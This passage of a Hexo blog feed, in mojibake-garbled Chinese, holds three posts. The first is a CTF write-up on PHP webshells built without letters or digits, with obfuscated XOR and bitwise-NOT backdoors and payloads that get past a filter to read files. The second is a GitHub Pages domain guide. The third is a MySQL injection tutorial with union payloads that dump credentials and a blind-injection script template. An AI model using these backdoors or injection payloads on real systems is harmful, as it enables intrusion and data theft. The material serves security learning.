Angel_Kittyã€‚åœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ã€‚</code></pre><p>ä¸‹é¢æ˜¯ä¸ªéå¸¸ç®€å•çš„éæ•°å­—å­—æ¯çš„PHPåé—¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>_POSTçš„æ‹¼æ¥å¯ä»¥å°†ä¸Šé¢çš„ä»£ç åˆå¹¶ä¸ºä¸€è¡Œï¼Œä»è€Œä½¿ç¨‹åºçš„å¯è¯»æ€§æ›´å·®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code>$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);æˆ–è€…$__=&quot;#./|&#123;&quot;^&quot;|~`//&quot;;</code></pre><p>æ³¨æ„#çš„urlç¼–ç ï¼Œå¦åˆ™ä¼šç›¸å½“äºæ³¨é‡Š</p><p>åŒæ ·_GETä¹Ÿå¯ä»¥è¿™æ ·æ‹¼æ¥</p><pre><code>$__=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;</code></pre><p>æŒ‰ç…§è¿™ç§æ–¹æ³•ï¼Œå¯å¾—payload</p><pre><code>?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag?code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();    //$_=&#39;getFlag&#39;?code=$å•Š=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$å•Š();</code></pre><p>ç›¸å½“äº <code>$å•Š=getFlag;$å•Š();</code></p><p>è¿™é‡Œå°±ä¸éœ€è¦ç”¨ <code>&#123;&#125;</code> äº†ï¼Œå› ä¸ºå–åçš„å€¼ç›´æ¥è¢«å½“ä½œå­—ç¬¦ä¸²èµ‹å€¼ç»™äº† $ å•Š</p><h3 id="æ–¹å¼2-å–åè¿ç®—"><a href="#æ–¹å¼2-å–åè¿ç®—" class="headerlink" title="æ–¹å¼2(å–åè¿ç®—)"></a>æ–¹å¼2(å–åè¿ç®—)</h3><p><strong>ä¸»è¦åŸç†ï¼š</strong></p><p>åˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥å–å</p><p>æ¯”å¦‚<code>&quot;å’Œ&quot;[2]</code>çš„ç»“æœæ˜¯<code>&quot;\x8c&quot;</code>ï¼Œå…¶å–åå³ä¸ºå­—æ¯s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure><p><img src="/2019/10/16/nowords-webshell/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg"></p><p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);     &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;        &#x2F;&#x2F;$_&#x3D;1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;ç°&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;a&#39;</span><br><span class="line">$___&#x3D;&quot;å’Œ&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);</span><br><span class="line">$___&#x3D;&quot;å’Œ&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$____&#x3D;&#39;as&#39;</span><br><span class="line">$___&#x3D;&quot;çš„&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;ass&#39;</span><br><span class="line">$___&#x3D;&quot;åŠ&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;asse&#39;</span><br><span class="line">$___&#x3D;&quot;å§‹&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$____&#x3D;&#39;assert&#39;</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;</span><br><span class="line">$___&#x3D;&quot;ä¿¯&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_P&#39;</span><br><span class="line">$___&#x3D;&quot;ç°&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_PO&#39;</span><br><span class="line">$___&#x3D;&quot;æ¬¡&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$_&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_POS&#39;</span><br><span class="line">$___&#x3D;&quot;ç«™&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$_&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_POST&#39;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;                    &#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæœ‰ä¸€ç§ç®€çŸ­çš„å†™æ³•<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>å®ƒç­‰äº$_GETã€‚è¿™é‡Œç›¸å½“äºç›´æ¥æŠŠutf8ç¼–ç çš„æŸä¸ªå­—èŠ‚æå–å‡ºæ¥ç»Ÿä¸€è¿›è¡Œå–åã€‚</p><p>é‚£éº½åˆ©ç”¨è¿™ç§æ–¹å¼å¯å¾—payload</p><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); //%_ä¸ºgetFlagå–åç„¶åURLç¼–ç å¾—ç»“æœæˆ–?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>æ‹¼æ¥å‡ºäº† $_GET<a href>â€˜+â€™</a>;ï¼Œä¼ å…¥ +=getFlag() ä»è€Œæ‰§è¡Œäº†å‡½æ•°</p><p><strong>æ³¨æ„ç‚¹ï¼š</strong></p><p>php5å’Œphp7æ˜¯æœ‰åŒºåˆ«çš„</p><p>PHP7å‰æ˜¯ä¸å…è®¸ç”¨<code>($a)()</code>;è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>(&#39;phpinfo&#39;)();</code>æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚</p><h2 id="å‡çº§ç‰ˆ"><a href="#å‡çº§ç‰ˆ" class="headerlink" title="å‡çº§ç‰ˆ"></a>å‡çº§ç‰ˆ</h2><p>å‡çº§ç‰ˆå¢åŠ äº†å¯¹<code>_</code>å’Œ<code>$</code>çš„è¿‡æ»¤ï¼Œä½†è¿˜æ˜¯æœ‰æ–¹æ³•ç»•è¿‡çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜æ–¹æ³•"><a href="#è§£é¢˜æ–¹æ³•" class="headerlink" title="è§£é¢˜æ–¹æ³•"></a>è§£é¢˜æ–¹æ³•</h3><p>è¿™é“é¢˜åˆšå¥½æ˜¯åœ¨linuxç³»ç»Ÿä¸Šï¼Œå¹¶ä¸”å¼€å¯äº†çŸ­æ ‡ç­¾</p><p>åœ¨linuxç³»ç»Ÿä¸­ï¼Œæ˜¯æ”¯æŒæ­£åˆ™çš„ï¼ŒæŸäº›ä½ å¿˜è®°æŸä¸ªå­—ç¬¦æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>? * %</code>ç­‰å­—ç¬¦æ¥æ›¿ä»£ï¼Œå½“ç„¶è¿™é‡Œæƒ³è¦æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦æé™çš„åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç»è¿‡æµ‹è¯•ï¼š</p><pre><code>???/??? =&gt; /bin/cat</code></pre><p>PHPå¼€å¯çŸ­æ ‡ç­¾å³<code>short_open_tag=on</code>æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>&lt;?=$_?&gt;</code>è¾“å‡ºå˜é‡<br>äºæ˜¯è¯»æºç ï¼š</p><pre><code>$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;&quot;/bin/cat /var/www/html/index.php&quot;</code></pre><p>é•¿åº¦è¶…å‡ºä¸Šé™ï¼Œä½¿ç”¨é€šé…ï¼š</p><pre><code>$_=/???/???%20/???/???/????/;?&gt;&lt;?=$_?&gt;</code></pre><p>æ­£åˆ™è¿‡æ»¤äº†$å’Œ_,æ”¹è¿›ä¸ºï¼š</p><pre><code>?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</code></pre><p>å¯ä»¥è¯»åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">    $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¯»flagæ–‡ä»¶</p><pre><code>?&gt;&lt;?=`/???/???%20/????`;?&gt;</code></pre><p>å‚è€ƒï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>githubåšå®¢ä¼˜åŒ–</title>
      <link href="2019/10/16/github-blog-domain/"/>
      <url>2019/10/16/github-blog-domain/</url>
      
        <content type="html"><![CDATA[<p>é—²æ¥æ— äº‹ï¼Œæäº†ä¸ªåŸŸåï¼Œè¯•è¯•æŠŠä¹°çš„åŸŸåè§£æåˆ°åšå®¢ä¸Šï¼</p><a id="more"></a><h2 id="github-pagesç»‘å®šè‡ªå·±çš„åŸŸå"><a href="#github-pagesç»‘å®šè‡ªå·±çš„åŸŸå" class="headerlink" title="github pagesç»‘å®šè‡ªå·±çš„åŸŸå"></a>github pagesç»‘å®šè‡ªå·±çš„åŸŸå</h2><h3 id="ä¿®æ”¹åŸŸåè§£æ"><a href="#ä¿®æ”¹åŸŸåè§£æ" class="headerlink" title="ä¿®æ”¹åŸŸåè§£æ"></a>ä¿®æ”¹åŸŸåè§£æ</h3><p>æˆ‘æ˜¯åœ¨è…¾è®¯äº‘ä¹°çš„åŸŸåï¼Œé˜¿é‡Œäº‘é…ç½®ä¹Ÿç±»ä¼¼</p><p><img src="/2019/10/16/github-blog-domain/20191015223633.png"></p><p>æ·»åŠ ä¸»æœºè®°å½•ä¸ºå­åŸŸåï¼ˆä¸èƒ½ä¸ºå…¨éƒ¨åŸŸåï¼Œè¿™é‡Œä¸ºblogï¼‰,è®°å½•ç±»å‹ä¸ºCNAME,è®°å½•å€¼ä¸ºåŸåšå®¢åœ°å€</p><h3 id="ä¿®æ”¹githubé¡¹ç›®é…ç½®"><a href="#ä¿®æ”¹githubé¡¹ç›®é…ç½®" class="headerlink" title="ä¿®æ”¹githubé¡¹ç›®é…ç½®"></a>ä¿®æ”¹githubé¡¹ç›®é…ç½®</h3><p>æ‰¾åˆ°åšå®¢é¡¹ç›®ï¼Œç„¶åSettingsï¼Œæ‰¾åˆ°Github Pages</p><p><img src="/2019/10/16/github-blog-domain/20191015224428.png"></p><p>å°†Custom domainè®¾ç½®æˆè‡ªå·±çš„åŸŸåï¼ˆæ²¡æœ‰<code>http://</code>æˆ–<code>https://</code>ï¼‰</p><h3 id="æ·»åŠ CNAMEæ–‡ä»¶"><a href="#æ·»åŠ CNAMEæ–‡ä»¶" class="headerlink" title="æ·»åŠ CNAMEæ–‡ä»¶"></a>æ·»åŠ CNAMEæ–‡ä»¶</h3><p>åœ¨åšå®¢ç›®å½•sourceæ–‡ä»¶å¤¹é‡Œæ·»åŠ CNAMEæ–‡ä»¶</p><p>å†…å®¹å¡«å†™ä¸ºä½ è¦è®¾ç½®çš„åŸŸå</p><p>ä¾‹å¦‚æˆ‘çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blog.moonback.xyz</span><br></pre></td></tr></table></figure><p>ç„¶å <code>hexo g</code> ,<code>hexo d</code>å°±è¡Œäº†</p><p>å¯èƒ½ä¸ä¼šé©¬ä¸Šè§£ææˆåŠŸï¼Œç­‰æ®µæ—¶é—´å°±å¥½</p>]]></content>
      
      
      
        <tags>
            
            <tag> åšå®¢ </tag>
            
            <tag> æŠ˜è…¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysqlæ³¨å…¥æ–¹æ³•</title>
      <link href="2019/10/16/mysql-injection/"/>
      <url>2019/10/16/mysql-injection/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†mysqlæ³¨å…¥çš„ä¸€äº›æ–¹æ³•ï¼</p><a id="more"></a><h2 id="å¯ä»¥å›æ˜¾sqlé”™è¯¯çš„æ³¨å…¥"><a href="#å¯ä»¥å›æ˜¾sqlé”™è¯¯çš„æ³¨å…¥" class="headerlink" title="å¯ä»¥å›æ˜¾sqlé”™è¯¯çš„æ³¨å…¥"></a>å¯ä»¥å›æ˜¾sqlé”™è¯¯çš„æ³¨å…¥</h2><h3 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h3><pre><code>å¿…äº†è§£çš„ä¸œè¥¿ï¼šæ•°æ®åº“information_schemaç”¨æ¥å­˜å‚¨å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„æ•°æ®åº“åç§°ï¼Œè¡¨åï¼Œå­—æ®µSCHEMATAè¡¨ï¼šæä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯    å­—æ®µschemata_nameï¼šæ‰€æœ‰æ•°æ®åº“çš„åç§°TABLESè¡¨ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯    å­—æ®µtable_schemaï¼šæ‰€æœ‰æ•°æ®åº“çš„åç§°(é‡å¤ï¼‰  å­—æ®µtable_name:æ‰€æœ‰è¡¨çš„åç§°COLUMNSè¡¨ï¼šæä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚    å­—æ®µtable_schemaï¼šæ‰€æœ‰æ•°æ®åº“çš„åç§°(é‡å¤ï¼‰  å­—æ®µtable_name:æ‰€æœ‰è¡¨çš„åç§°ï¼ˆé‡å¤ï¼‰    å­—æ®µcolumn_nameï¼šæ‰€æœ‰åˆ—çš„åç§°</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ï¼Ÿid&#x3D;-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23</span><br></pre></td></tr></table></figure><p>â€‹    è§£é‡Šï¼š<br>â€‹        <code>id=-1</code>                                           æ˜¯ä¸ºäº†è®©ç½‘é¡µå›æ˜¾ä¸äº†å†…å®¹ï¼Œä»è€Œè®©è”åˆæŸ¥è¯¢çš„ç»“æœæ˜¾ç¤º<br>â€‹        <code>%27</code>                                                å•å¼•å·â€™çš„urlç¼–ç ,é—­åˆidçš„å†…å®¹<br>â€‹        <code>%20</code>                                                ä»£è¡¨ç©ºæ ¼çš„urlç¼–ç <br>â€‹        <code>union</code>                                            è”åˆæŸ¥è¯¢å­—ç¬¦<br>â€‹        <code>group_concat()</code>å‡½æ•°                                å°†æŸ¥è¯¢çš„ç»“æœä¸€è¡Œæ˜¾ç¤º<br>â€‹        <code>null,group_concat(schema_name),null</code>                ä¸ªæ•°å–å†³äºç½‘é¡µæœ¬èº«æŸ¥è¯¢çš„å­—æ®µä¸ªæ•°<br>â€‹        <code>%23</code>                                              #å·çš„urlç¼–ç ï¼Œå¯ä»¥ç”¨<code>--%20</code>ä»£æ›¿ï¼Œç”¨äºæ³¨é‡Šåé¢çš„sqlè¯­å¥</p><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><pre><code>payload:?id=1&#39; order by 3%23åˆ¤å½“å‰é¡µé¢æ•°æ®è¡¨å…±æœ‰å¤šå°‘åˆ—</code></pre><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><ol><li><p><strong>åˆ¤æ–­å›æ˜¾ä½</strong></p><pre><code> ?id=-1&#39; union select 1,2,3%23</code></pre></li><li><p><strong>çˆ†æ•°æ®åº“</strong></p><pre><code> ?id=-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23</code></pre></li><li><p><strong>çˆ†è¡¨</strong></p><pre><code> ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=database()%23 æˆ– ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=&#39;xxxx&#39;%23 xxxä¸ºçˆ†å‡ºæ¥çš„æ•°æ®åº“å å‰ä¸¤ä¸ªæ­¥éª¤å¯ä»¥ç›´æ¥å†™æˆï¼š ?id=-1&#39; union select null,group_concat(schema_name),(select group_concat(table_name) from information_schema.tables where table_schema=database()) from information_schema.schemata%23</code></pre></li><li><p><strong>çˆ†å­—æ®µ</strong></p><pre><code> ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;xxx&#39;%23 ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()%23 æœ€å¥½æ˜¯ç¬¬äºŒç§ï¼Œå¯¹æ•°æ®åº“é™åˆ¶ï¼Œé˜²æ­¢ä¸åŒæ•°æ®åº“æœ‰ç›¸åŒçš„è¡¨</code></pre></li><li><p><strong>çˆ†å†…å®¹</strong></p><pre><code> ?id=-1&#39; union select null,group_concat(username,0x23,password),null from security.users where id=2 %23</code></pre></li></ol><h3 id="é‡ç‚¹ç†è§£"><a href="#é‡ç‚¹ç†è§£" class="headerlink" title="é‡ç‚¹ç†è§£"></a>é‡ç‚¹ç†è§£</h3><pre><code>åœ¨ä¸çŸ¥é“å¦‚ä½•æ„é€ payload,å¯ä»¥å…ˆè®©å…¶æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯åˆ†ææ„é€ ç›®çš„ï¼š    è®©ä¼ å‚å‰é¢çš„ç¬¦å·é—­åˆï¼Œä½¿åé¢çš„è”åˆæŸ¥è¯¢å½“æˆsqlè¯­å¥æ‰§è¡Œ</code></pre><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>ä»€ä¹ˆæ˜¯ç›²æ³¨å‘¢ï¼Ÿ</p><p>ç®€å•è¯´ï¼Œå½“æƒ³è¦å¾—åˆ°çš„æ•°æ®ä¿¡æ¯(æ¯”å¦‚æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåç­‰)æ— æ³•å›æ˜¾åˆ°å±å¹•ä¸Šï¼Œå°±å¯ä»¥ç”¨æŸäº›å‡½æ•°å¯¹æ•°æ®è¿›è¡Œçˆ†ç ´å¤„ç†ã€‚</p><p>æ¯”å¦‚æƒ³è¦å¾—åˆ°æ•°æ®åº“åï¼Œå°±å¯ä»¥ç”¨å‡½æ•°æˆªå–æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åçˆ†ç ´ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ç­‰äºæŸä¸ªå­—ç¬¦ï¼Œå°±è®©å…¶æ‰§è¡ŒæŸäº›æ“ä½œï¼ˆæ¯”å¦‚ï¼Œç¡3sï¼‰ï¼Œä¸æ–­è¿›è¡Œä¸‹ä¸€ä¸ªå­—ç¬¦çš„çˆ†ç ´ï¼Œæ‹¼æ¥èµ·æ¥å°±æ˜¯æ•°æ®</p><p>å…ˆä»‹ç»å‡ ä¸ªå‡½æ•°</p><p><strong>ifå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šIF(Condition,A,B)å«ä¹‰ï¼šå¦‚æœConditionæˆç«‹ï¼Œåˆ™Aï¼Œå¦åˆ™B</code></pre><p><strong>substrå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šSUBSTR(string,start,len)å«ä¹‰ï¼šä»stringçš„startä½å¼€å§‹æˆªå–lenä¸ªå­—ç¬¦</code></pre><p><strong>midå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šMID(column_name,start[,length])å«ä¹‰ï¼šä»column_nameä¸­startä½å¼€å§‹æˆªå–length(å¯é€‰å‚æ•°)é•¿åº¦</code></pre><p><strong>asciiå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šASCII(char)å«ä¹‰ï¼šå°†charè½¬åŒ–æˆasciiç </code></pre><p><strong>leftå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šLEFT ( string, n )å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚</code></pre><p><strong>rightå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šRIGHT( string, n )å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å³éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚</code></pre><p><strong>lengthå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šLENGTH(string)å«ä¹‰ï¼šå¾—åˆ°stringçš„é•¿åº¦</code></pre><h3 id="åŸºäºæ—¶é—´çš„ç›²æ³¨"><a href="#åŸºäºæ—¶é—´çš„ç›²æ³¨" class="headerlink" title="åŸºäºæ—¶é—´çš„ç›²æ³¨"></a>åŸºäºæ—¶é—´çš„ç›²æ³¨</h3><p>åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼ˆå»¶æ—¶æ³¨å…¥ï¼‰æ˜¯ä¸»è¦é’ˆå¯¹é¡µé¢æ— å˜åŒ–ã€æ— æ³•ç”¨å¸ƒå°”çœŸå‡åˆ¤æ–­ã€æ— æ³•æŠ¥é”™çš„æƒ…å†µä¸‹çš„æ³¨å…¥æŠ€æœ¯</p><p>è¿™é‡ŒåŸºäºæ—¶é—´çš„ç›²æ³¨ä¸»è¦ç”¨çš„å°±æ˜¯sleep()å‡½æ•°ï¼Œæ ¹æ®ååº”æ—¶é—´æ¥ç¡®å®šæ˜¯å¦æ­£ç¡®</p><p>ä¸€èˆ¬ç”¨ä¸‹é¢çš„æ¨¡æ¿å°±å¯ä»¥è§£å†³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">payload&#x3D; &#39;*** and if(ascii(substr(***,1,1))&#x3D;*,sleep(3),0)%23&#39;</span><br><span class="line">r&#x3D;requests.get(url+payload,timeout&#x3D;3)&#x2F;&#x2F;æ³¨æ„è¦è®¾ç½®è®¾ç½®timeout</span><br><span class="line">except requests.exceptions.ReadTimeout as e:&#x2F;&#x2F;è¶…æ—¶å¼‚å¸¸</span><br><span class="line">data+&#x3D;chr(j)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><h3 id="å¸ƒå°”å‹ç›²æ³¨"><a href="#å¸ƒå°”å‹ç›²æ³¨" class="headerlink" title="å¸ƒå°”å‹ç›²æ³¨"></a>å¸ƒå°”å‹ç›²æ³¨</h3><p>å¸ƒå°”å‹ç›²æ³¨å’ŒåŸºäºæ—¶é—´çš„ç›²æ³¨æœ€å¤§çš„åŒºåˆ«å°±æ˜¯å¸ƒå°”å‹ç›²æ³¨æ˜¯æ 